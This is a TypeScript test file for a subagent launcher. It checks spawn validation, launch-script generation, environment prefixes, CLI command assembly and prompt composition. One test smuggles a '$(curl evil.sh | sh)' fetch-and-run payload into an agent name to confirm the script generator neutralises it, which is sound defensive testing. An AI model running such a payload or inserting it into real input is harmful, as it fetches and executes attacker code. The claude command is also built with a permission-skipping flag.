import assert from "node:assert/strict";
import { mkdtempSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { describe, it } from "node:test";
import { fileURLToPath } from "node:url";
import { exitSummaryFallback } from "../pi-extension/subagents/delivery.ts";
import {
  buildClaudeCommand,
  buildPiInvocation,
  buildSubagentEnvPrefix,
} from "../pi-extension/subagents/launch/command-builder.ts";
import {
  composeSystemPromptParts,
  validateSpawnCombos,
} from "../pi-extension/subagents/launch/policies.ts";
import { buildLaunchScript } from "../pi-extension/subagents/mux/api.ts";
import { getShellReadyDelayMs } from "../pi-extension/subagents/shell.ts";
import "./helpers.ts";

describe("validateSpawnCombos", () => {
  const base = { interactive: false };

  it("rejects silent degradations around the claude CLI", () => {
    assert.throws(
      () =>
        validateSpawnCombos({ ...base, resumeSessionId: "s1", cli: undefined }),
      /resumeSessionId is only supported for claude-backed agents/,
    );
    assert.throws(
      () => validateSpawnCombos({ ...base, fork: true, cli: "claude" }),
      /fork is not supported for claude-backed agents/,
    );
    assert.throws(
      () => validateSpawnCombos({ ...base, fork: true, interactive: true }),
      /fork spawns cannot be interactive/,
    );
    assert.throws(
      () =>
        validateSpawnCombos({ ...base, cli: "claude", tools: "read, bash" }),
      /tools cannot be restricted on claude-backed agents/,
    );
    assert.throws(
      () => validateSpawnCombos({ ...base, cli: "claude", interactive: true }),
      /interactive is not supported for claude-backed agents/,
    );
    assert.throws(
      () =>
        validateSpawnCombos({ ...base, cli: "claude", skills: "chrome-cdp" }),
      /skills have no mapping on claude-backed agents/,
    );
  });

  it("accepts the plain and claude-resumable combinations", () => {
    validateSpawnCombos(base);
    validateSpawnCombos({ ...base, cli: "claude", resumeSessionId: "s1" });
    validateSpawnCombos({ ...base, tools: "read, bash" });
  });
});

describe("buildLaunchScript", () => {
  it("scrubs control characters from preamble comments so names cannot inject script lines", () => {
    const evil = "report\n$(curl evil.sh | sh)\n#";
    const script = buildLaunchScript(
      "pi --session s.jsonl",
      [`# Subagent launch script for ${evil}`, "# Generated: now"].join("\n"),
    );
    // Everything the attacker smuggled in past the first newline stays on
    // one inert comment line.
    const lines = script.split("\n");
    assert.equal(lines[0], "#!/bin/bash");
    assert.ok(lines[1]!.startsWith("# Subagent launch script for"));
    assert.ok(lines[1]!.includes("$(curl evil.sh | sh)"));
    assert.doesNotMatch(lines[1]!, /\n/);
    assert.equal(lines[2], "pi --session s.jsonl");
    // Tabs and other control characters are scrubbed too.
    assert.doesNotMatch(buildLaunchScript("true", "# a\tb"), /\t/);
  });
});

describe("launch command primitives", () => {
  const childExtensionPath = fileURLToPath(
    new URL("../pi-extension/subagents/child.ts", import.meta.url),
  );

  it("builds the shared subagent env prefix in one fixed order", () => {
    const prefix = buildSubagentEnvPrefix({
      name: "Scout: Auth",
      sessionFile: "/tmp/s.jsonl",
      id: "ab12cd34",
      activityFile: "/tmp/act.json",
      agent: "scout",
      surface: "pane.1",
      interactive: true,
      denyTools: new Set(["bash", "write"]),
      agentConfigDir: "/cfg",
      depth: 2,
    });
    assert.equal(
      prefix,
      "PI_CODING_AGENT_DIR='/cfg' PI_DENY_TOOLS='bash,write' " +
        "PI_SUBAGENT_NAME='Scout: Auth' PI_SUBAGENT_AGENT='scout' " +
        "PI_SUBAGENT_INTERACTIVE=1 PI_SUBAGENT_SESSION='/tmp/s.jsonl' " +
        "PI_SUBAGENT_ID='ab12cd34' PI_SUBAGENT_DEPTH=2 " +
        "PI_SUBAGENT_ACTIVITY_FILE='/tmp/act.json' " +
        "PI_SUBAGENT_SURFACE='pane.1' ",
    );
  });

  it("omits optional env assignments entirely when unspecified", () => {
    assert.equal(
      buildSubagentEnvPrefix({
        name: "W",
        sessionFile: "/s",
        id: "i",
        activityFile: "/a",
      }),
      "PI_SUBAGENT_NAME='W' PI_SUBAGENT_SESSION='/s' " +
        "PI_SUBAGENT_ID='i' PI_SUBAGENT_ACTIVITY_FILE='/a' ",
    );
  });

  it("assembles the pi invocation: cd + env + session + child extension + args + DONE marker", () => {
    // Pin the mux away from herdr so the herdr-only `--tui-mode regular`
    // injection stays out of this pin regardless of the host terminal
    // (tmux hosts resolve the preference, herdr hosts fall back to null).
    process.env.PI_SUBAGENT_MUX = "tmux";
    try {
      const command = buildPiInvocation({
        sessionFile: "/tmp/s.jsonl",
        envPrefix: "PI_SUBAGENT_NAME='W' ",
        escapedArgs: [
          "--model",
          "'anthropic/claude-haiku-4-5'",
          "'@/tmp/task.md'",
        ],
        effectiveCwd: "/home/user/proj",
      });
      assert.equal(
        command,
        "cd '/home/user/proj' && PI_SUBAGENT_NAME='W' " +
          `pi --session '/tmp/s.jsonl' -e '${childExtensionPath}' ` +
          "--model 'anthropic/claude-haiku-4-5' '@/tmp/task.md'; " +
          "echo '__SUBAGENT_DONE_'$?'__'",
      );
    } finally {
      delete process.env.PI_SUBAGENT_MUX;
    }
  });

  it("forces --tui-mode regular on herdr (alt-screen breaks the exit poll)", () => {
    // herdr runtime availability needs the env trio plus a herdr on PATH;
    // stub the binary so this pin holds on hosts that never run herdr.
    const stubBin = mkdtempSync(join(tmpdir(), "pi-stub-bin-"));
    writeFileSync(join(stubBin, "herdr"), "#!/bin/sh\nexit 0\n", {
      mode: 0o755,
    });
    const savedPath = process.env.PATH;
    process.env.PATH = `${stubBin}:${savedPath}`;
    process.env.PI_SUBAGENT_MUX = "herdr";
    process.env.HERDR_ENV = "1";
    process.env.HERDR_PANE_ID = "stub:p1";
    try {
      const command = buildPiInvocation({
        sessionFile: "/tmp/s.jsonl",
        envPrefix: "PI_SUBAGENT_NAME='W' ",
        escapedArgs: [],
        effectiveCwd: "/home/user/proj",
      });
      assert.match(
        command,
        / pi --session '\/tmp\/s\.jsonl' --tui-mode regular /,
      );
    } finally {
      process.env.PATH = savedPath;
      delete process.env.PI_SUBAGENT_MUX;
      delete process.env.HERDR_ENV;
      delete process.env.HERDR_PANE_ID;
      rmSync(stubBin, { recursive: true, force: true });
    }
  });

  it("builds the claude invocation with sentinel, plugin dir, and params-over-defaults prompt", () => {
    const { command, sentinelFile } = buildClaudeCommand({
      id: "ab12cd34",
      task: "do the thing",
      systemPrompt: "PROMPT",
      resumeSessionId: "sess-1",
      model: "claude-sonnet-4",
      agentBody: "You are Scout.",
      effectiveCwd: "/w",
      depth: 2,
    });
    // Unguessable /tmp sentinel: 128-bit random id, not the running id.
    assert.match(sentinelFile, /^\/tmp\/pi-claude-[0-9a-f]{16}-done$/);
    assert.ok(command.startsWith("cd '/w' && "));
    assert.ok(command.includes(`PI_CLAUDE_SENTINEL='${sentinelFile}'`));
    // The nesting depth propagates through the claude hop.
    assert.ok(command.includes("PI_SUBAGENT_DEPTH=2 "));
    assert.ok(command.includes("claude --dangerously-skip-permissions"));
    // The repo ships pi-extension/subagents/plugin, so the flag is present.
    assert.ok(command.includes("--plugin-dir"));
    assert.ok(command.includes("--model 'claude-sonnet-4'"));
    // params.systemPrompt wins over the agent-file body on the claude path.
    assert.ok(command.includes("--append-system-prompt 'PROMPT'"));
    assert.ok(command.includes("--resume 'sess-1'"));
    assert.ok(
      command.endsWith("'do the thing'; echo '__SUBAGENT_DONE_'$?'__'"),
    );
  });

  it("falls back to error/exit/placeholder summaries in order", () => {
    assert.equal(
      exitSummaryFallback({
        exitCode: 0,
        errorMessage: "overloaded",
      }),
      "Subagent error: overloaded",
    );
    assert.equal(
      exitSummaryFallback({ exitCode: 3 }),
      "Sub-agent exited with code 3",
    );
    assert.equal(
      exitSummaryFallback({ exitCode: 0 }),
      "Sub-agent exited without output",
    );
    assert.equal(
      exitSummaryFallback({ exitCode: 0 }, "Resumed session", "new output"),
      "Resumed session exited without new output",
    );
  });

  it("system prompt parts: contract rides append, identity lands by mode", () => {
    const autonomous = composeSystemPromptParts({
      identity: null,
      interactive: false,
    });
    assert.ok(
      autonomous.append.includes("Ending your turn finishes this task"),
    );
    assert.ok(autonomous.append.includes("ask_question"));
    assert.ok(!autonomous.append.includes("subagent_done"));
    assert.equal(autonomous.replace, null);

    const interactive = composeSystemPromptParts({
      identity: null,
      interactive: true,
    });
    assert.ok(interactive.append.includes("user-driven"));
    assert.equal(interactive.replace, null);

    // No declared mode: identity merges into the append payload (it used to
    // lead the first message; same content, new channel).
    const plain = composeSystemPromptParts({
      identity: "IDENT",
      interactive: false,
    });
    assert.ok(plain.append.startsWith("IDENT\n\n"));
    assert.ok(plain.append.includes("Ending your turn"));
    assert.equal(plain.replace, null);

    // replace mode: identity owns --system-prompt, contract owns append.
    const replace = composeSystemPromptParts({
      identity: "IDENT",
      systemPromptMode: "replace",
      interactive: false,
    });
    assert.equal(replace.replace, "IDENT");
    assert.ok(!replace.append.includes("IDENT"));
    assert.ok(replace.append.includes("Ending your turn"));

    // append mode: a single append slot exists, so identity merges with the
    // contract into one payload.
    const appendMode = composeSystemPromptParts({
      identity: "IDENT",
      systemPromptMode: "append",
      interactive: false,
    });
    assert.equal(appendMode.replace, null);
    assert.ok(appendMode.append.startsWith("IDENT\n\n"));
    assert.ok(appendMode.append.includes("Ending your turn"));
  });
});

describe("getShellReadyDelayMs", () => {
  it("returns 500 by default and honors a valid override", () => {
    const prev = process.env.PI_SUBAGENT_SHELL_READY_DELAY_MS;
    try {
      delete process.env.PI_SUBAGENT_SHELL_READY_DELAY_MS;
      assert.equal(getShellReadyDelayMs(), 500);

      process.env.PI_SUBAGENT_SHELL_READY_DELAY_MS = "2500";
      assert.equal(getShellReadyDelayMs(), 2500);

      process.env.PI_SUBAGENT_SHELL_READY_DELAY_MS = "not-a-number";
      assert.equal(getShellReadyDelayMs(), 500);

      process.env.PI_SUBAGENT_SHELL_READY_DELAY_MS = "-5";
      assert.equal(getShellReadyDelayMs(), 500);
    } finally {
      if (prev === undefined) {
        delete process.env.PI_SUBAGENT_SHELL_READY_DELAY_MS;
      } else {
        process.env.PI_SUBAGENT_SHELL_READY_DELAY_MS = prev;
      }
    }
  });
});
